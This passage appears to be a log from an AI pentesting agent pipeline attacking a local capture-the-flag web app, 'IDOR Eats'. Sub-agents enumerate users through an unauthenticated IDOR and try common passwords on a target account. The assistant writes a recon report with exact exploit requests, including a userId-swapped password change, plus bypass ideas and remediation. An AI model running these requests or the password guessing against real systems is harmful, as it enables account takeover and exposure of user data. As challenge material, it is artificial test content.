.php while authenticated (maintain PHPSESSID cookie from login). I need to discover:\\n1. The profile page structure and what data is displayed\\n2. What parameters are | result=requester agent result\\nconfidence_score: 0.95\\ndetailed_summary:\\n## IDOR Discovery Complete - Critical Vulnerabilities Found\\n\\n### Profile Page Analysis (/profile.php)\\n**Current User Data:**\\n- Username: testuser123\\n- Email: test@test.com\\n- User ID: 13\\n\\n**Profile Structure:**\\n- Displays profile picture\\n[requester] prompt=Complete the reconnaissance for IDOR exploitation:\\n\\n1. Test login for userId=1 (username=\\\'not_that_easy\\\') with common passwords like \\\'password\\\', \\\'admin\\\', \\\'not_that_easy\\\' to see if we can authenticate\\n | result=requester agent result\\nconfidence_score: 0.85\\ndetailed_summary:\\n## IDOR Challenge Reconnaissance Summary\\n\\n### Application Endpoints Discovered:\\n\\n**Frontend Pages:**\\n- `/index.php` - Main landing page with restaurant search\\n- `/login.php` - Login form page (HTML frontend, form submits AJAX to api/log\\n[shell] prompt=Perform advanced reconnaissance on the IDOR Eats application:\\n\\n1. Use curl to check for common files and endpoints that might reveal admin panels or configuration:\\n   - /admin.php, /admin/, /config.ph | result=shell agent result\\nconfidence_score: 0.75\\ndetailed_summary:\\nSuccessfully completed advanced reconnaissance on the IDOR Eats application at 192.168.208.2:\\n\\n**Discovered Endpoints:**\\n1. /index.php - Main landing page\\n2. /login.php - Login form (uses api/login.php via AJAX)\\n3. /register.php - Registrat\', \'supervisor_history\': \'Target : 127.0.0.1:32973\', \'task_achieved\': True, \'detailed_summary\': "Comprehensive reconnaissance completed for IDOR Eats restaurant platform at 127.0.0.1:32973. Successfully discovered and mapped all relevant endpoints, authentication mechanisms, and confirmed IDOR vulnerabilities. \\n\\n**Key Findings:**\\n1. **Public Endpoints**: /api/register.php, /api/login.php, /api/search_restaurants.php (no auth required)\\n2. **Protected Endpoints**: /profile.php, /api/change_password.php, /logout.php (requires PHPSESSID)\\n3. **IDOR Vulnerability #1** (Unauthenticated): GET /api/get_favorite_restaurants.php?userId=<ID> - can read any user\'s favorites and username without authentication. Enumerated: userId=1=not_that_easy, userId=7=admin\\n4. **IDOR Vulnerability #2** (Authenticated): POST /api/change_password.php accepts userId parameter with oldPassword, newPassword, confirmPassword - vulnerable to IDOR if authenticated\\n\\n**Attack Requirements:**\\n- Register/login to obtain PHPSESSID\\n- Modify userId parameter in change_password.php request\\n- oldPassword validation is enforced (requires target password or bypass)\\n- Target users: userId=1 (not_that_easy) or userId=7 (admin)\\n\\n**Application Structure:**\\n- PHP/MySQL stack with Apache/2.4.41\\n- Session-based authentication (PHPSESSID cookie)\\n- Directory listing at /include/ (config.php)\\n- No SQL injection or backup files found", \'proofs\': \'Discovered Endpoints:\\n- GET /api/get_favorite_restaurants.php?userId=1 returns: {"success":true,"data":{"username":"not_that_easy","restaurants":["Pizza Place","Sushi World","Burger Joint","Pasta House","Taco Stand","BBQ Spot","Salad Bar","Dessert Shop"]}}\\n- GET /api/get_favorite_restaurants.php?userId=7 returns: {"success":true,"data":{"username":"admin","restaurants":["Dessert Shop","Pizza Place","Sushi World"]}}\\n- POST /api/change_password.php returns: {"success":false,"message":"Old password is incorrect."} (confirms userId parameter processing)\\n- POST /api/change_password.php without auth returns: {"success":false,"message":"User not authenticated."}\\n- POST /api/register.php with params username, email, password returns: {"success":true,"message":"Registration successful."}\\n- POST /api/login.php with params username, password returns: {"success":true,"message":"Login successful."} plus Set-Cookie: PHPSESSID header\\n\\nEnumerated Users via IDOR:\\n- userId=1: username=not_that_easy (target user per challenge)\\n- userId=7: username=admin\\n- userId=2-6,8-10: regular users (user1, john_doe, jane_smith, alice_johnson, bob_brown, charlie_davis, diana_moore, eva_wilson)\', \'last_output\': {\'task_achieved\': True, \'confidence_score\': 0.9, \'detailed_summary\': "Comprehensive reconnaissance completed for IDOR Eats restaurant platform at 127.0.0.1:32973. Successfully discovered and mapped all relevant endpoints, authentication mechanisms, and confirmed IDOR vulnerabilities. \\n\\n**Key Findings:**\\n1. **Public Endpoints**: /api/register.php, /api/login.php, /api/search_restaurants.php (no auth required)\\n2. **Protected Endpoints**: /profile.php, /api/change_password.php, /logout.php (requires PHPSESSID)\\n3. **IDOR Vulnerability #1** (Unauthenticated): GET /api/get_favorite_restaurants.php?userId=<ID> - can read any user\'s favorites and username without authentication. Enumerated: userId=1=not_that_easy, userId=7=admin\\n4. **IDOR Vulnerability #2** (Authenticated): POST /api/change_password.php accepts userId parameter with oldPassword, newPassword, confirmPassword - vulnerable to IDOR if authenticated\\n\\n**Attack Requirements:**\\n- Register/login to obtain PHPSESSID\\n- Modify userId parameter in change_password.php request\\n- oldPassword validation is enforced (requires target password or bypass)\\n- Target users: userId=1 (not_that_easy) or userId=7 (admin)\\n\\n**Application Structure:**\\n- PHP/MySQL stack with Apache/2.4.41\\n- Session-based authentication (PHPSESSID cookie)\\n- Directory listing at /include/ (config.php)\\n- No SQL injection or backup files found", \'proofs\': \'Discovered Endpoints:\\n- GET /api/get_favorite_restaurants.php?userId=1 returns: {"success":true,"data":{"username":"not_that_easy","restaurants":["Pizza Place","Sushi World","Burger Joint","Pasta House","Taco Stand","BBQ Spot","Salad Bar","Dessert Shop"]}}\\n- GET /api/get_favorite_restaurants.php?userId=7 returns: {"success":true,"data":{"username":"admin","restaurants":["Dessert Shop","Pizza Place","Sushi World"]}}\\n- POST /api/change_password.php returns: {"success":false,"message":"Old password is incorrect."} (confirms userId parameter processing)\\n- POST /api/change_password.php without auth returns: {"success":false,"message":"User not authenticated."}\\n- POST /api/register.php with params username, email, password returns: {"success":true,"message":"Registration successful."}\\n- POST /api/login.php with params username, password returns: {"success":true,"message":"Login successful."} plus Set-Cookie: PHPSESSID header\\n\\nEnumerated Users via IDOR:\\n- userId=1: username=not_that_easy (target user per challenge)\\n- userId=7: username=admin\\n- userId=2-6,8-10: regular users (user1, john_doe, jane_smith, alice_johnson, bob_brown, charlie_davis, diana_moore, eva_wilson)\'}, \'supervisor_response\': \'Task achieved: True\\nConfidence: 0.90\\nDetailed summary:\\nComprehensive reconnaissance completed for IDOR Eats restaurant platform at 127.0.0.1:32973. Successfully discovered and mapped all relevant endpoints, authentication mechanisms, and confirmed IDOR vulnerabilities. \\n\\n**Key Findings:**\\n1. **Public Endpoints**: /api/register.php, /api/login.php, /api/search_restaurants.php (no auth required)\\n2. **Protected Endpoints**: /profile.php, /api/change_password.php, /logout.php (requires PHPSESSID)\\n3. **IDOR Vulnerability #1** (Unauthenticated): GET /api/get_favorite_restaurants.php?userId=<ID> - can read any user\\\'s favorites and username without authentication. Enumerated: userId=1=not_that_easy, userId=7=admin\\n4. **IDOR Vulnerability #2** (Authenticated): POST /api/change_password.php accepts userId parameter with oldPassword, newPassword, confirmPassword - vulnerable to IDOR if authenticated\\n\\n**Attack Requirements:**\\n- Register/login to obtain PHPSESSID\\n- Modify userId parameter in change_password.php request\\n- oldPassword validation is enforced (requires target password or bypass)\\n- Target users: userId=1 (not_that_easy) or userId=7 (admin)\\n\\n**Application Structure:**\\n- PHP/MySQL stack with Apache/2.4.41\\n- Session-based authentication (PHPSESSID cookie)\\n- Directory listing at /include/ (config.php)\\n- No SQL injection or backup files found\\n\\nProofs:\\nDiscovered Endpoints:\\n- GET /api/get_favorite_restaurants.php?userId=1 returns: {"success":true,"data":{"username":"not_that_easy","restaurants":["Pizza Place","Sushi World","Burger Joint","Pasta House","Taco Stand","BBQ Spot","Salad Bar","Dessert Shop"]}}\\n- GET /api/get_favorite_restaurants.php?userId=7 returns: {"success":true,"data":{"username":"admin","restaurants":["Dessert Shop","Pizza Place","Sushi World"]}}\\n- POST /api/change_password.php returns: {"success":false,"message":"Old password is incorrect."} (confirms userId parameter processing)\\n- POST /api/change_password.php without auth returns: {"success":false,"message":"User not authenticated."}\\n- POST /api/register.php with params username, email, password returns: {"success":true,"message":"Registration successful."}\\n- POST /api/login.php with params username, password returns: {"success":true,"message":"Login successful."} plus Set-Cookie: PHPSESSID header\\n\\nEnumerated Users via IDOR:\\n- userId=1: username=not_that_easy (target user per challenge)\\n- userId=7: username=admin\\n- userId=2-6,8-10: regular users (user1, john_doe, jane_smith, alice_johnson, bob_brown, charlie_davis, diana_moore, eva_wilson)\'}\n'}, {'role': 'assistant', 'content': '', 'thinking_content': 'Let me analyze the assessment data and write a comprehensive reconnaissance report. I need to extract:\n\n1. Target information\n2. Endpoints discovered\n3. Authentication mechanisms\n4. Confirmed vulnerabilities (IDOR)\n5. Exact payloads and requests\n6. Proof/evidence\n7. Attack requirements\n\nLet me structure this into the required report format.', 'tool_calls': [{'id': 'functions.write_workspace_file:0', 'type': 'function', 'function': {'name': 'write_workspace_file', 'arguments': '{"path":"reports/recon_report.md","ctx":"Security assessment reconnaissance report for IDOR Eats restaurant platform","content":"# IDOR Eats - Reconnaissance Report\\n\\n## TL;DR\\n- **Objective**: Reconnaissance for Insecure Direct Object Reference (IDOR) vulnerability exploitation\\n- **Outcome**: Successfully mapped endpoints, identified two IDOR vulnerabilities, enumerated user accounts\\n- **Highest-impact finding**: Authenticated IDOR in change_password.php allowing potential password modification of other users\\n- **Validation status**: IDOR vulnerabilities confirmed, but exploitation requires bypass of oldPassword validation\\n\\n---\\n\\n## Target Information\\n- **Target**: IDOR Eats restaurant search platform\\n- **Host / base URL**: http://127.0.0.1:32973/\\n- **Application**: PHP/MySQL-based restaurant search and rating platform\\n- **Authentication context**: Session-based authentication using PHPSESSID cookie\\n- **Technology details**: PHP/MySQL stack with Apache/2.4.41, AJAX-based API endpoints\\n\\n---\\n\\n## Confirmed Vulnerabilities\\n\\n### IDOR Vulnerability #1: Unauthenticated User Data Exposure via get_favorite_restaurants.php\\n- **Affected endpoint**: `GET /api/get_favorite_restaurants.php?userId=<ID>`\\n- **Impact**: Can read any user\'s username and favorite restaurants without authentication\\n- **Preconditions**: None - no authentication required\\n- **Parameters**: `userId` (integer)\\n- **Exact request**:\\n```\\nGET /api/get_favorite_restaurants.php?userId=1 HTTP/1.1\\nHost: 127.0.0.1:32973\\n```\\n- **Exact response**:\\n```json\\n{\\"success\\":true,\\"data\\":{\\"username\\":\\"not_that_easy\\",\\"restaurants\\":[\\"Pizza Place\\",\\"Sushi World\\",\\"Burger Joint\\",\\"Pasta House\\",\\"Taco Stand\\",\\"BBQ Spot\\",\\"Salad Bar\\",\\"Dessert Shop\\"]}}\\n```\\n\\n### IDOR Vulnerability #2: Authenticated Password Change with userId Parameter\\n- **Affected endpoint**: `POST /api/change_password.php`\\n- **Impact**: Can attempt to change password for arbitrary users by modifying the userId parameter\\n- **Preconditions**: Valid PHPSESSID cookie (authentication required)\\n- **Parameters**: `userId`, `oldPassword`, `newPassword`, `confirmPassword`\\n- **Exact request**:\\n```\\nPOST /api/change_password.php HTTP/1.1\\nHost: 127.0.0.1:32973\\nCookie: PHPSESSID=<active_session>\\nContent-Type: application/x-www-form-urlencoded\\n\\nuserId=7&oldPassword=test&newPassword=hacked&confirmPassword=hacked\\n```\\n- **Exact response** (when oldPassword is wrong):\\n```json\\n{\\"success\\":false,\\"message\\":\\"Old password is incorrect.\\"}\\n```\\n- **Exact response** (when not authenticated):\\n```json\\n{\\"success\\":false,\\"message\\":\\"User not authenticated.\\"}\\n```\\n\\n---\\n\\n## Steps to Reproduce\\n\\n### Reproduce IDOR #1 (Unauthenticated Data Disclosure)\\n1. Send HTTP GET request to `/api/get_favorite_restaurants.php?userId=<number>`\\n2. Enumerate userId values (1-10 confirmed, userId=1 and userId=7 are high-value targets)\\n3. Extract usernames and personal preferences from response\\n\\n### Reproduce IDOR #2 (Authenticated Password Change Attempt)\\n1. Register a new user via `POST /api/register.php` with `username`, `email`, `password`\\n2. Login via `POST /api/login.php` with `username`, `password` to obtain PHPSESSID\\n3. Send POST request to `/api/change_password.php` with:\\n   - Modified `userId` parameter (target: 1 or 7)\\n   - `oldPassword` value (requires victim\'s password)\\n   - `newPassword` and `confirmPassword`\\n\\n---\\n\\n## Validation / Evidence\\n\\n### Enumerated Users via IDOR\\n| userId | username | Notes |\\n|--------|----------|-------|\\n| 1 | not_that_easy | Challenge target user |\\n| 2-6 | user1, john_doe, jane_smith, alice_johnson, bob_brown | Regular users |\\n| 7 | admin | Admin account |\\n| 8-10 | charlie_davis, diana_moore, eva_wilson | Regular users |\\n\\n### API Endpoints Discovered\\n\\n**Public Endpoints (No Authentication Required):**\\n- `GET /index.php` - Main landing page\\n- `GET /login.php` - Login form (HTML)\\n- `GET /register.php` - Registration form (HTML)\\n- `POST /api/register.php` - Registration endpoint\\n  - Parameters: `username`, `email`, `password`\\n  - Response: `{\\"success\\":true,\\"message\\":\\"Registration successful.\\"}`\\n- `POST /api/login.php` - Login endpoint\\n  - Parameters: `username`, `password`\\n  - Response: `{\\"success\\":true,\\"message\\":\\"Login successful.\\"}` + `Set-Cookie: PHPSESSID`\\n- `GET /api/search_restaurants.php` - Restaurant search\\n- `GET /api/get_favorite_restaurants.php?userId=<ID>` - **IDOR VULNERABLE**\\n\\n**Protected Endpoints (Authentication Required):**\\n- `GET /profile.php` - User profile page (displays userId in URL or form)\\n- `POST /api/change_password.php` - **IDOR VULNERABLE**\\n- `GET /logout.php` - Logout endpoint\\n\\n### Response Evidence\\n\\n**Successful registration:**\\n```json\\n{\\"success\\":true,\\"message\\":\\"Registration successful.\\"}\\n```\\n\\n**Successful login:**\\n```json\\n{\\"success\\":true,\\"message\\":\\"Login successful.\\"}\\n```\\n**Plus Header:** `Set-Cookie: PHPSESSID=<value>; path=/`\\n\\n**IDOR data exposure for userId=7:**\\n```json\\n{\\"success\\":true,\\"data\\":{\\"username\\":\\"admin\\",\\"restaurants\\":[\\"Dessert Shop\\",\\"Pizza Place\\",\\"Sushi World\\"]}}\\n```\\n\\n### Attack Requirements\\n1. Register/login to obtain valid PHPSESSID cookie\\n2. Modify `userId` parameter in POST request to `/api/change_password.php`\\n3. Bypass `oldPassword` validation (exact validation enforced - requires target password or bypass technique)\\n4. Target users: userId=1 (not_that_easy) or userId=7 (admin)\\n\\n### Notes on Reliability / Limitations\\n- `oldPassword` validation is strictly enforced - requires exploitation technique to bypass\\n- No SQL injection vulnerabilities discovered\\n- Directory listing enabled at `/include/` (config.php visible but not accessible directly)\\n- No backup files or source code disclosure found\\n\\n---\\n\\n## Remediation\\n\\n### Root Cause\\n1. **Missing authorization checks**: The `get_favorite_restaurants.php` endpoint does not verify if the requesting user owns the requested data.\\n2. **User-controlled object reference**: The `change_password.php` endpoint accepts a user-controlled `userId` parameter without validating that the authenticated user owns that account.\\n\\n### Recommended Fix\\n1. **For get_favorite_restaurants.php**: \\n   - Remove `userId` parameter from public API\\n   - Infer userId from authenticated session (PHPSESSID)\\n   - Return 401/403 if accessed without valid session\\n\\n2. **For change_password.php**:\\n   - Remove `userId` parameter from request\\n   - Infer userId from session: `$_SESSION[\'user_id\']`\\n   - Do not allow modifying other users\' passwords via any parameter\\n\\n### Defense-in-Depth\\n- Implement proper authorization checks for all sensitive operations\\n- Use indirect object references (mapping tables) instead of sequential IDs\\n- Log all authentication and sensitive operations\\n- Add rate limiting to authentication endpoints\\n- Disable directory listing on Apache: `Options -Indexes`\\n\\n---\\n\\n## How to Verify the Fix\\n\\n1. **Test IDOR #1 Fix**:\\n   ```bash\\n   curl \\"http://127.0.0.1:32973/api/get_favorite_restaurants.php?userId=1\\"\\n   ```\\n   **Expected secure result**: \\n   ```json\\n   {\\"success\\":false,\\"message\\":\\"User not authenticated.\\"}\\n   ```\\n   OR the endpoint should be removed/changed to use session-based lookup.\\n\\n2. **Test IDOR #2 Fix**:\\n   ```bash\\n   curl -X POST \\"http://127.0.0.1:32973/api/change_password.php\\" \\\\\\n     -H \\"Cookie: PHPSESSID=<your_session>\\" \\\\\\n     -d \\"userId=7&oldPassword=anything&newPassword=test&confirmPassword=test\\"\\n   ```\\n   **Expected secure result**: \\n   - The `userId` parameter is ignored or rejected\\n   - Only the authenticated user\'s password (from session) is changed\\n   - Response should not indicate processing of the supplied userId\\n\\n---\\n\\n## Remaining Leads\\n\\n### Confirmed Blockers\\n- `oldPassword` validation is enforced on `change_password.php` - requires valid password for target user\\n- Login attempts for userId=1 (not_that_easy) with common passwords failed\\n\\n### Unverified Leads\\n- Potential for oldPassword bypass techniques (SQL injection, null byte, parameter pollution)\\n- Check if userId parameter can be manipulated via type juggling (integer vs string)\\n- Test if `include/config.php` is accessible or contains credentials\\n\\n### Missing Context\\n- No successful exploitation of IDOR #2 (password change) confirmed - only reconnaissance\\n- No FLAG value observed yet (requires full exploitation)\\n- Unknown whether additional parameters or CSRF tokens are involved in password change\\n- No information on password complexity requirements\\n\\n---\\n\\n*Report generated from reconnaissance phase - ready for exploitation testing*\\n"}'}}]}, {'tool_call_id': 'functions.write_workspace_file:0', 'role': 'tool', 'name': 'write_workspace_file', 'content': 'Wrote 8277 bytes to /reports/recon_report.md'}, {'role': 'assistant', 'content': "The reconnaissance report has been written to `reports/recon_report.md`. \n\n## Summary of Key Findings\n\n### Confirmed IDOR Vulnerabilities\n\n1. **Unauthenticated User Enumeration** (`/api/get_favorite_restaurants.php?userId=<ID>`)\n   - Can read any user's username and favorite restaurants without authentication\n   - Successfully enumerated userId=1 (not_that_easy) and userId=7 (admin)\n\n2. **Authenticated Password Change IDOR** (`POST /api/change_password.php`)\n   - Accepts `userId` parameter allowing targeting of other users\n   - Requires valid PHPSESSID but validates `oldPassword`\n\n### Critical Endpoints\n\n| Endpoint | Auth Required | Purpose |\n|----------|--------------|---------|\n| `/api/register.php` | No | User registration |\n| `/api/login.php` | No | Authentication ( returns PHPSESSID ) |\n| `/api/get_favorite_restaurants.php` | No | **VULNERABLE - IDOR** |\n| `/api/change_password.php` | Yes | **VULNERABLE - IDOR** |\n\n### Attack Prerequisites for Exploitation\n- Register/login to obtain valid `PHPSESSID` cookie\n- **Blocker confirmed**: `oldPassword` validation is enforced - requires victim password or bypass technique\n\nThe report includes exact HTTP requests, response snippets, enumerated user data, and remediation guidance.", 'thinking_content': 'I\'ve written the reconnaissance report to `reports/recon_report.md`. The report summarizes all findings from the assessment data, including:\n\n1. **Two confirmed IDOR vulnerabilities**:\n   - Unauthenticated user data exposure via `get_favorite_restaurants.php`\n   - Authenticated password change with user-controlled `userId` parameter\n\n2. **Exact payloads and evidence**:\n   - Full HTTP requests with parameters\n   - JSON response snippets proving the vulnerabilities\n   - Enumerated user list (userId=1 "not_that_easy" and userId=7 "admin" are targets)\n\n3. **Authentication requirements**:\n   - Session-based auth using PHPSESSID cookie\n   - Public endpoints vs protected endpoints clearly documented\n\n4. **Attack requirements**:\n   - Valid PHPSESSID required for change_password.php\n   - `oldPassword` validation is enforced (confirmed blocker)\n   - userId parameter accepts arbitrary values but requires bypass for exploitation\n\nThe report is ready and contains all information needed for the exploitation phase.'}] usage=TokenUsageInfo(prompt_tokens=11127, completion_tokens=2782, total_tokens=13909) request_count=2 tool_call_count=1
